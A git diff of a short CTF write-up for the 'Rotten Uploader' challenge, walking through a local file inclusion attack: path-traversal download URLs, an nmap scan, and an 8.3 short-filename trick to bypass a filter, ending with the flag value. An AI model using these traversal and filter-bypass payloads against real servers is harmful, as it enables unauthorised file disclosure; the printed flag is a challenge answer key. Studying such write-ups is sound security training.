@@ -1,12 +1,12 @@
 # Rotten Uploader writeup(LFI)
 [Challenge.](http://rup.chal.ctf.westerns.tokyo/)
 
-![Landing](/images/Landing.png)
+![Landing](images/Landing.png)
 
 Begin to hover a link to reveal: `http://rup.chal.ctf.westerns.tokyo/download.php?f=test.cpp`
 
 Is vulnerable to LFI? Yes!
-Get the index.php with  `http://rup.chal.ctf.westerns.tokyo/download.php?f=../index.php` , cause download take file from upload dir.
+Get the index.php with  `http://rup.chal.ctf.westerns.tokyo/download.php?f=../index.php`  ( ../ cause download take file from upload dir ).
 
 ```
 <?php
@@ -59,4 +59,27 @@ readfile('uploads/' . $_GET['f']); // safe_dir is enabled.
 ?>
 ```
 Basically the filter drops the GET for the file_list file... 
+
+Make some information gathering could help to evade the filter: `nmap -O -Pn  rup.chal.ctf.westerns.tokyo`
+
+It's seems that the web server run over Win, now we can try to converte the filename to [8.3 filename.](https://en.wikipedia.org/wiki/8.3_filename)
+
+LFI(8.3) => `http://rup.chal.ctf.westerns.tokyo/download.php?f=../file_l~1.php`
+
+```
+<?php
+$files = [
+  [FALSE, 1, 'test.cpp', 1135, 'test.cpp'],
+  [FALSE, 2, 'test.c', 74, 'test.c'],
+  [TRUE, 3, 'flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7', 35, 'flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7'], # <-- The flag File
+  [FALSE, 4, 'test.rb', 1446, 'test.rb'],
+];
+```
+
+Now download  `http://rup.chal.ctf.westerns.tokyo/download.php?f=flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7` , open and the flag is: TWCTF{Hotto_Smile}.
+
+
+
+
+
 
